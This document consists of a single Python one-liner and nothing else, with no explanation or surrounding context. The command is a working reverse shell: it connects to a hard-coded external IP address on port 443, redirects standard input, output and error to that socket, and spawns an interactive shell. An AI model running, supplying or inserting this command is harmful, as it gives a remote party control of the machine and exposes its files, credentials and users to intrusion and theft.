python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("143.198.50.168",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
